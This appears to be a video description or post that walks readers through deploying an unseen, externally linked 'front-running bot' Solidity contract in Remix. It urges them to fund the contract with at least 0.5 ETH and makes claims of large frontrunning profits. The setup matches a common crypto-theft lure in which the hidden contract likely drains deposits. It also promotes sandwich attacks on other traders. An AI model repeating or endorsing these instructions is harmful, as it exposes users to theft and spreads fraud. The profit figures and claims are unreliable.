Download MetaMask: https://metamask.io/download
or
Download Coin Base Wallet:  https://www.coinbase.com/wallet
or
Download Trust Wallet:  https://trustwallet.com/ru/browser-ex...
If you're using Trust Wallet or Coinbase Wallet all steps are exact the same as with Meta Mask Wallet.

 Head over to Remix: https://remix.ethereum.org/

 Create “New File”. Rename it whatever you want or “bot.sol”

 Paste THIS code into Remix: https://github.com/davincij15code/front-running-bot-uniswap/blob/main/bot.sol


 Go to the "Compile" tab on Remix and Compile with Solidity version 0.8.19

 Go to the “Deploy & Run Transactions” tab on Remix, select the “Injected Provider” environment, then “Deploy”. This will create your own contract by confirming the MetaMask Contract creation fee.

 Make sure your deposit is more than 0.5 ETH( to prevent negating slippage ) to your exact contract/bot address.

 Click on the “Key” button, and copy your key to VALUE

 In the “SetBalancePercent” or “SetBalanceETH” functions, enter the amount of money the bot will work with.

 Click “StartNative” button to get the bot started

 To withdraw funds from your smart contract, click on “Stop” button, then “Withdraw”

Share your profits in the comments section below. Like and subscribe for more lucrative Solidity tutorials.

 How can I restore the old contract again?
Instead of "Deploy" by creating a new contract in the "DEPLOY & RUN TRANSACTIONS" section, you can access your old contract again by typing the old contract address you created in the "At Address" field and clicking the "At Address" button.
Note: Access cannot be made with any other account other than your MetaMask account where you created the contract.
 Explore passive earnings with our in-depth guide to MEV BOT strategies.

***Hello, guys. Many people asked me if it makes sense to use less than 0.5-1, I wrote you a detailed answer:

If you use less than 0.5-1ETH , you will most likely lose your funds, because it is usually very difficult to get profit from such amount

For example if someone creates a transaction for $300 with 10% slippage and you want to frontrun it, => it's gonna cost you 2 prices of current gas for swap (sandwich swap = 2 swaps for buy and sell), it s about 80 dollars, and the maximum you can get is 10% of $300, in the final it will bring losses of $50

But on the other side, transaction for $10,000 with a 10% slippage will bring you about $920 net-profit by frontrunning it.
